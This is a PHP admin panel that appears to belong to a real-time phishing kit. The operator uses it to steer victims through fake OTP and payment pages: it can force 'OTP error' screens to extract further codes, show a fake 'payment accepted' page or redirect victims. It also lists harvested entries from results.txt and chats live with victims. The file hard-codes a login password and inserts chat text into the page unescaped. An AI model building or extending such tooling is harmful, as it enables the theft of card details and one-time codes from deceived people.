<?php
session_start();

$stateFile = __DIR__ . '/admin_state.json';
$resultsFile = __DIR__ . '/results.txt';
$chatLogFile = __DIR__ . '/chat_log.json';

$validUser = 'admin';
$validPass = 'JJKadmin2026';
$message = '';

function loadSmsState($file)
{
    $defaults = [
        'mode' => 'default',
        'custom_url' => '',
        'instruction' => 'stay_wait',
        'instruction_token' => time(),
        'chat_enabled' => false
    ];

    if (!file_exists($file)) {
        return $defaults;
    }

    $data = json_decode(file_get_contents($file), true);
    $state = is_array($data) ? array_merge($defaults, $data) : $defaults;

    if (isset($state['mode']) && $state['mode'] === 'otp_pass') {
        $state['mode'] = 'default';
        $state['instruction'] = $state['instruction'] ?? 'otp_pass';
    }

    if (empty($state['instruction_token'])) {
        $state['instruction_token'] = time();
    }

    return $state;
}

function saveSmsState($file, $mode, $customUrl, $instruction, $chatEnabled)
{
    $timestamp = time();
    $payload = [
        'mode' => $mode,
        'custom_url' => $mode === 'redirect_custom' ? trim($customUrl) : '',
        'instruction' => $instruction,
        'instruction_token' => $timestamp,
        'chat_enabled' => (bool) $chatEnabled
    ];

    file_put_contents($file, json_encode($payload, JSON_PRETTY_PRINT));
}

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: admin.php');
    exit;
}

if (isset($_POST['action']) && $_POST['action'] === 'login') {
    $user = trim($_POST['username'] ?? '');
    $pass = $_POST['password'] ?? '';

    if ($user === $validUser && $pass === $validPass) {
        $_SESSION['is_admin'] = true;
    } else {
        $message = 'Invalid username or password.';
    }
}

$isAdmin = !empty($_SESSION['is_admin']);

if ($isAdmin && isset($_POST['ajax']) && $_POST['ajax'] === 'update_sms') {
    $smsMode = $_POST['sms_mode'] ?? 'default';
    $customUrl = trim($_POST['custom_url'] ?? '');
    $instruction = $_POST['instruction'] ?? 'stay_wait';
    $chatEnabled = !empty($_POST['chat_enabled']);

    $validModes = ['default', 'payment_accept', 'redirect_wait', 'redirect_custom', 'error_verification'];
    $validInstructions = ['stay_wait', 'prompt_otp', 'otp_error', 'otp_pass'];

    if (!in_array($smsMode, $validModes, true)) {
        $message = 'Invalid SMS mode selection.';
        $success = false;
    } elseif (!in_array($instruction, $validInstructions, true)) {
        $message = 'Invalid instruction selection.';
        $success = false;
    } elseif ($smsMode === 'redirect_custom' && !filter_var($customUrl, FILTER_VALIDATE_URL)) {
        $message = 'Please provide a full, valid URL for custom redirects (e.g., https://example.com/page).';
        $success = false;
    } else {
        saveSmsState($stateFile, $smsMode, $customUrl, $instruction, $chatEnabled);
        $message = 'SMS page updated successfully.';
        $success = true;
    }

    header('Content-Type: application/json');
    echo json_encode([
        'success' => $success ?? false,
        'message' => $message,
        'state' => loadSmsState($stateFile)
    ]);
    exit;
}

$currentState = loadSmsState($stateFile);
$resultsContent = file_exists($resultsFile) ? file_get_contents($resultsFile) : '';

$resultsEntries = [];
$page = isset($_GET['page']) ? max(1, (int) $_GET['page']) : 1;
$perPage = 10;

if (trim($resultsContent) !== '') {
    $resultsEntries = array_reverse(preg_split('/\n\s*\n/', trim($resultsContent)) ?: []);
}

$totalEntries = count($resultsEntries);
$totalPages = max(1, (int) ceil($totalEntries / $perPage));
$page = min($page, $totalPages);
$offset = ($page - 1) * $perPage;
$paginatedResults = array_slice($resultsEntries, $offset, $perPage);
$chatLog = file_exists($chatLogFile) ? json_decode(file_get_contents($chatLogFile), true) : [];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>
    <style>
        body { font-family: Arial, sans-serif; background: radial-gradient(circle at top, #1a1a1a 0%, #090909 58%, #050505 100%); color: #f5f5f5; margin: 0; }
        .container { max-width: 1200px; margin: 30px auto; background: #111; padding: 24px; border-radius: 16px; box-shadow: 0 16px 42px rgba(0, 0, 0, 0.45); border: 1px solid #272727; }
        .card { background: linear-gradient(180deg, #1a1a1a 0%, #151515 100%); padding: 18px; border-radius: 12px; border: 1px solid #2d2d2d; }
        .login-wrapper { max-width: 420px; margin: 80px auto; }
        .top-bar { display: flex; justify-content: space-between; align-items: center; gap: 16px; margin-bottom: 16px; background: #181818; border: 1px solid #2d2d2d; border-radius: 12px; padding: 14px 16px; }
        .logout-link { color: #9ed0ff; font-weight: 600; }
        .admin-grid { display: grid; grid-template-columns: 1.15fr 1fr; gap: 16px; margin-top: 14px; }
        .stack { display: flex; flex-direction: column; gap: 16px; }
        .flow-form { display: flex; flex-direction: column; gap: 16px; }
        .form-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 12px 20px; }
        .form-row { display: flex; flex-direction: column; gap: 8px; }
        .form-row label { font-weight: 600; }
        input[type="text"], input[type="password"], textarea { width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #333; background: #111; color: #f5f5f5; box-sizing: border-box; }
        textarea { min-height: 84px; resize: vertical; }
        .radio-section { background: #0f0f0f; border: 1px solid #2a2a2a; border-radius: 10px; padding: 12px; }
        .radio-section h3 { margin: 0 0 10px; font-size: 15px; color: #f2f2f2; }
        .radio-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 10px; }
        .radio-option { display: flex; align-items: flex-start; gap: 8px; background: #151515; border: 1px solid #2f2f2f; border-radius: 10px; padding: 10px; }
        .radio-option input[type="radio"] { margin-top: 2px; accent-color: #e50914; }
        .radio-option strong { display: block; color: #fff; font-size: 14px; }
        .radio-option span { display: block; color: #bbbbbb; font-size: 12px; margin-top: 3px; line-height: 1.4; }
        .custom-url-wrapper { transition: opacity 0.2s ease; }
        .custom-url-wrapper.disabled { opacity: 0.5; }
        .button-row { display: flex; justify-content: flex-start; align-items: center; gap: 10px; }
        .live-chat-toggle { display: flex; gap: 10px; align-items: center; background: #0f0f0f; border: 1px solid #2a2a2a; border-radius: 10px; padding: 10px 12px; margin-bottom: 12px; }
        .live-chat-toggle input[type="checkbox"] { accent-color: #e50914; width: 18px; height: 18px; }
        .live-chat-toggle label { font-weight: 700; }
        .live-chat-toggle small { display: block; color: #bdbdbd; }
        button { padding: 10px 16px; border: none; border-radius: 8px; background: #e50914; color: #fff; cursor: pointer; }
        button:hover { background: #b20710; }
        .message { padding: 12px; background: #1f3b1f; border: 1px solid #2e7d32; color: #b9f6ca; border-radius: 6px; margin-bottom: 12px; }
        .error { background: #3b1f1f; border-color: #c62828; color: #ffcdd2; }
        .hint { color: #bdbdbd; margin: 0 0 10px; font-size: 13px; }
        .chat-box { background: #0f0f0f; border: 1px solid #2a2a2a; border-radius: 8px; padding: 12px; max-height: 370px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; }
        .chat-message { padding: 8px; border-radius: 8px; }
        .chat-message.admin { background: #17212b; border: 1px solid #2c3e50; }
        .chat-message.user { background: #1b2a18; border: 1px solid #2e7d32; }
        .chat-meta { font-size: 12px; color: #9e9e9e; }
        .chat-composer { display: flex; gap: 10px; align-items: flex-end; margin-top: 12px; }
        .chat-composer textarea { min-height: 66px; margin: 0; }
        .chat-composer button { min-height: 66px; min-width: 110px; font-weight: 700; }
        .results-entry { background: #0f0f0f; border: 1px solid #2a2a2a; border-radius: 6px; padding: 12px; margin-bottom: 12px; white-space: pre-wrap; word-break: break-word; }
        .results-pagination { display: flex; justify-content: center; gap: 8px; flex-wrap: wrap; margin-top: 12px; }
        .results-pagination a, .results-pagination span { padding: 8px 12px; border-radius: 4px; border: 1px solid #333; background: #1f1f1f; color: #f5f5f5; text-decoration: none; }
        .results-pagination .active { background: #e50914; border-color: #e50914; }
        .results-pagination .disabled { opacity: 0.5; cursor: default; }
        @media (max-width: 940px) {
            .admin-grid { grid-template-columns: 1fr; }
            .chat-composer { flex-direction: column; align-items: stretch; }
            .chat-composer button { min-height: 46px; width: 100%; }
        }
    </style>
</head>
<body>
<?php if (!$isAdmin): ?>
    <div class="login-wrapper">
        <div class="card">
            <h1>Admin Login</h1>
            <?php if ($message): ?><div class="message error"><?php echo htmlspecialchars($message); ?></div><?php endif; ?>
            <form method="post" class="form-grid" novalidate>
                <input type="hidden" name="action" value="login">
                <div class="form-row"><label for="username">Username</label><input type="text" id="username" name="username" required></div>
                <div class="form-row"><label for="password">Password</label><input type="password" id="password" name="password" required></div>
                <button type="submit">Login</button>
            </form>
        </div>
    </div>
<?php else: ?>
    <div class="container">
        <div class="top-bar">
            <h1>Admin Panel</h1>
            <a class="logout-link" href="?logout=1">Logout</a>
        </div>

        <?php if ($message): ?><div class="message"><?php echo htmlspecialchars($message); ?></div><?php endif; ?>
        <div class="message" id="flash-message" style="display:none;"></div>

        <div class="admin-grid">
            <div class="stack">
                <div class="card">
                    <h2>Unified User Flow Control</h2>
                    <p class="hint">Financial instruction + SMS behavior are combined below with radio controls for faster admin use.</p>
                    <form method="post" class="flow-form" id="sms-form" novalidate>
                        <div class="radio-section">
                            <h3>Choose what sms.php should do</h3>
                            <div class="radio-grid">
                                <label class="radio-option"><input type="radio" name="sms_mode" value="default" <?php echo $currentState['mode'] === 'default' ? 'checked' : ''; ?>><span><strong>Show OTP form</strong><span>Normal SMS verification page.</span></span></label>
                                <label class="radio-option"><input type="radio" name="sms_mode" value="payment_accept" <?php echo $currentState['mode'] === 'payment_accept' ? 'checked' : ''; ?>><span><strong>Show payment accepted</strong><span>Display a success confirmation screen.</span></span></label>
                                <label class="radio-option"><input type="radio" name="sms_mode" value="redirect_wait" <?php echo $currentState['mode'] === 'redirect_wait' ? 'checked' : ''; ?>><span><strong>Redirect to waiting PHP</strong><span>Move the user to wait.php?next=sms.php.</span></span></label>
                                <label class="radio-option"><input type="radio" name="sms_mode" value="redirect_custom" <?php echo $currentState['mode'] === 'redirect_custom' ? 'checked' : ''; ?>><span><strong>Custom redirection URL</strong><span>Send user to your custom URL.</span></span></label>
                                <label class="radio-option"><input type="radio" name="sms_mode" value="error_verification" <?php echo $currentState['mode'] === 'error_verification' ? 'checked' : ''; ?>><span><strong>Show verification error</strong><span>Trigger a temporary invalid OTP state.</span></span></label>
                            </div>
                        </div>

                        <div class="radio-section">
                            <h3>Financial instruction for the next user step</h3>
                            <div class="radio-grid">
                                <label class="radio-option"><input type="radio" name="instruction" value="stay_wait" <?php echo $currentState['instruction'] === 'stay_wait' ? 'checked' : ''; ?>><span><strong>Keep user on waiting PHP</strong><span>User remains on wait.php until next update.</span></span></label>
                                <label class="radio-option"><input type="radio" name="instruction" value="prompt_otp" <?php echo $currentState['instruction'] === 'prompt_otp' ? 'checked' : ''; ?>><span><strong>Send user to SMS page (sms.php)</strong><span>Return user to OTP entry screen.</span></span></label>
                                <label class="radio-option"><input type="radio" name="instruction" value="otp_error" <?php echo $currentState['instruction'] === 'otp_error' ? 'checked' : ''; ?>><span><strong>Send OTP error</strong><span>Show an OTP error then allow retry.</span></span></label>
                                <label class="radio-option"><input type="radio" name="instruction" value="otp_pass" <?php echo $currentState['instruction'] === 'otp_pass' ? 'checked' : ''; ?>><span><strong>Show SMS pass</strong><span>Display successful SMS OTP pass state.</span></span></label>
                            </div>
                        </div>

                        <div class="form-row custom-url-wrapper" id="custom-url-wrapper">
                            <label for="custom_url">Custom redirect URL (for specific URL option)</label>
                            <input type="text" id="custom_url" name="custom_url" value="<?php echo htmlspecialchars($currentState['custom_url']); ?>" placeholder="https://example.com/path">
                        </div>
                        <div class="button-row">
                            <button type="submit">Apply Flow Update</button>
                        </div>
                    </form>
                </div>

                <div class="card">
                    <h2>Saved Results (results.txt)</h2>
                    <?php if ($totalEntries === 0): ?>
                        <div class="chat-meta">No results saved yet.</div>
                    <?php else: ?>
                        <?php foreach ($paginatedResults as $entry): ?>
                            <div class="results-entry"><?php echo nl2br(htmlspecialchars($entry)); ?></div>
                        <?php endforeach; ?>
                        <?php if ($totalPages > 1): ?>
                            <div class="results-pagination">
                                <?php if ($page > 1): ?><a href="?page=<?php echo $page - 1; ?>">&laquo; Prev</a><?php else: ?><span class="disabled">&laquo; Prev</span><?php endif; ?>
                                <?php for ($p = 1; $p <= $totalPages; $p++): ?>
                                    <?php if ($p === $page): ?><span class="active"><?php echo $p; ?></span><?php else: ?><a href="?page=<?php echo $p; ?>"><?php echo $p; ?></a><?php endif; ?>
                                <?php endfor; ?>
                                <?php if ($page < $totalPages): ?><a href="?page=<?php echo $page + 1; ?>">Next &raquo;</a><?php else: ?><span class="disabled">Next &raquo;</span><?php endif; ?>
                            </div>
                        <?php endif; ?>
                    <?php endif; ?>
                </div>
            </div>

            <div class="card">
                <h2>Live Chat Admin</h2>
                <p class="hint">Enable chat from this side, then reply to users in real-time.</p>
                <div class="live-chat-toggle">
                    <input type="checkbox" id="chat_enabled" name="chat_enabled" value="1" form="sms-form" <?php echo !empty($currentState['chat_enabled']) ? 'checked' : ''; ?>>
                    <div>
                        <label for="chat_enabled">Enable live chat</label>
                        <small>When disabled, user-side support chat is hidden.</small>
                    </div>
                </div>
                <div class="chat-box" id="chat-box">
                    <?php if (!empty($chatLog)): ?>
                        <?php foreach ($chatLog as $entry): ?>
                            <div class="chat-message <?php echo htmlspecialchars($entry['sender']); ?>">
                                <div><?php echo nl2br(htmlspecialchars($entry['message'])); ?></div>
                                <div class="chat-meta"><?php echo htmlspecialchars(ucfirst($entry['sender'])); ?> • <?php echo date('Y-m-d H:i:s', $entry['timestamp']); ?></div>
                            </div>
                        <?php endforeach; ?>
                    <?php else: ?><div class="chat-meta">No messages yet.</div><?php endif; ?>
                </div>
                <label for="admin-chat-message">Send a message</label>
                <div class="chat-composer">
                    <textarea id="admin-chat-message" placeholder="Write your message to the user..." <?php echo empty($currentState['chat_enabled']) ? 'disabled' : ''; ?>></textarea>
                    <button type="button" id="send-admin-message" <?php echo empty($currentState['chat_enabled']) ? 'disabled' : ''; ?>>Send</button>
                </div>
            </div>
        </div>
    </div>
<?php endif; ?>
</body>
<script>
    const chatBox = document.getElementById('chat-box');
    const chatInput = document.getElementById('admin-chat-message');
    const sendButton = document.getElementById('send-admin-message');
    const smsForm = document.getElementById('sms-form');
    const flashMessage = document.getElementById('flash-message');
    const customUrlWrapper = document.getElementById('custom-url-wrapper');
    let adminChatPoller = null;

    function getRadioValue(name) {
        const selected = smsForm ? smsForm.querySelector(`input[name="${name}"]:checked`) : null;
        return selected ? selected.value : null;
    }

    function setRadioValue(name, value) {
        if (!smsForm) return;
        const radio = smsForm.querySelector(`input[name="${name}"][value="${value}"]`);
        if (radio) {
            radio.checked = true;
        }
    }

    function toggleCustomUrl() {
        if (!smsForm || !customUrlWrapper) return;
        const showCustom = getRadioValue('sms_mode') === 'redirect_custom';
        customUrlWrapper.classList.toggle('disabled', !showCustom);
    }

    function setAdminChatEnabled(enabled) {
        if (!chatInput || !sendButton) return;

        chatInput.disabled = !enabled;
        sendButton.disabled = !enabled;

        if (enabled) {
            fetchChat();
            if (!adminChatPoller) {
                adminChatPoller = setInterval(fetchChat, 1000);
            }
        } else if (adminChatPoller) {
            clearInterval(adminChatPoller);
            adminChatPoller = null;
        }
    }

    function renderChat(messages) {
        if (!chatBox) return;
        chatBox.innerHTML = '';

        if (!messages.length) {
            chatBox.innerHTML = '<div class="chat-meta">No messages yet.</div>';
            return;
        }

        messages.forEach((entry) => {
            const wrapper = document.createElement('div');
            wrapper.className = `chat-message ${entry.sender}`;
            wrapper.innerHTML = `
                <div>${entry.message.replace(/\n/g, '<br>')}</div>
                <div class="chat-meta">${entry.sender.charAt(0).toUpperCase() + entry.sender.slice(1)} • ${entry.formatted}</div>
            `;
            chatBox.appendChild(wrapper);
        });

        chatBox.scrollTop = chatBox.scrollHeight;
    }

    async function fetchChat() {
        try {
            const response = await fetch('chat_api.php?action=fetch');
            const data = await response.json();
            if (data.messages) {
                renderChat(data.messages);
            }
        } catch (e) {
            console.error('Unable to fetch chat updates', e);
        }
    }

    async function sendChatMessage() {
        if (!chatInput || chatInput.disabled || !chatInput.value.trim()) return;
        const message = chatInput.value.trim();
        chatInput.value = '';

        try {
            await fetch('chat_api.php?action=send', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams({ sender: 'admin', message })
            });
            fetchChat();
        } catch (e) {
            console.error('Unable to send message', e);
        }
    }

    if (sendButton && chatInput) {
        sendButton.addEventListener('click', sendChatMessage);
        chatInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter' && !e.shiftKey) {
                e.preventDefault();
                sendChatMessage();
            }
        });

        setAdminChatEnabled(!chatInput.disabled);
    }

    async function updateSmsState(event) {
        event.preventDefault();
        if (!smsForm) return;

        const formData = new FormData(smsForm);
        formData.append('ajax', 'update_sms');

        try {
            const response = await fetch('admin.php', {
                method: 'POST',
                headers: { 'X-Requested-With': 'XMLHttpRequest' },
                body: formData
            });

            const data = await response.json();
            if (flashMessage) {
                flashMessage.style.display = 'block';
                flashMessage.textContent = data.message || 'Update failed.';
                flashMessage.classList.toggle('error', !data.success);
            }

            if (data.state) {
                setRadioValue('sms_mode', data.state.mode);
                setRadioValue('instruction', data.state.instruction);
                const customUrlInput = smsForm.querySelector('#custom_url');
                if (customUrlInput) {
                    customUrlInput.value = data.state.custom_url || '';
                }
                const chatCheckbox = smsForm.querySelector('#chat_enabled');
                if (chatCheckbox) {
                    chatCheckbox.checked = !!data.state.chat_enabled;
                }

                setAdminChatEnabled(!!data.state.chat_enabled);
                toggleCustomUrl();
            }
        } catch (e) {
            console.error('Unable to update SMS page', e);
            if (flashMessage) {
                flashMessage.style.display = 'block';
                flashMessage.textContent = 'Unable to reach the server.';
                flashMessage.classList.add('error');
            }
        }
    }

    if (smsForm) {
        smsForm.addEventListener('submit', updateSmsState);
        smsForm.querySelectorAll('input[name="sms_mode"]').forEach((radio) => {
            radio.addEventListener('change', toggleCustomUrl);
        });
        toggleCustomUrl();
    }
</script>
</html>
